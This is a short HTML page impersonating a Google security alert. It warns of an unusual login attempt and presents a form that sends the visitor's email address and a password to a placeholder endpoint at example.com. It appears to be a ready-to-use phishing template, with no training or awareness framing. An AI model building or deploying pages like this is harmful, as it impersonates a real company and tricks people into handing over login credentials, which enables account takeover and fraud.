<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Alert - Password Reset Required</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 400px;
      width: 100%;
    }
    .logo {
      width: 150px;
      margin-bottom: 20px;
    }
    h2 {
      color: #d7263d;
      font-size: 22px;
    }
    p {
      color: #555;
      font-size: 16px;
      margin-bottom: 20px;
    }
    form {
      margin: 40px; /* Added margin on all sides */
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
    }
    .reset-btn {
      width: 100%; /* Reduced width */
      background: #1a73e8;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.3s;
      display: block;
      margin: 10px auto; /* Centers the button */
    }
    .reset-btn:hover {
      background: #135abe;
    }
    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="google-logo.png" alt="Google Logo" class="logo">
    
    <h2>Security Alert: Unusual Login Attempt Detected</h2>
    <p>We've detected an unusual login attempt from a new device. For security reasons, please reset your password immediately.</p>

    <form action="https://example.com/reset-password" method="POST">
      <input type="email" name="email" placeholder="Enter your email" required>
      <input type="password" name="new-password" placeholder="Enter new password" required>
      <button type="submit" class="reset-btn">Reset Password</button>
    </form>
    
    <p class="footer">If you did not request this, please ignore this email or contact support.</p>
  </div>
</body>
</html>
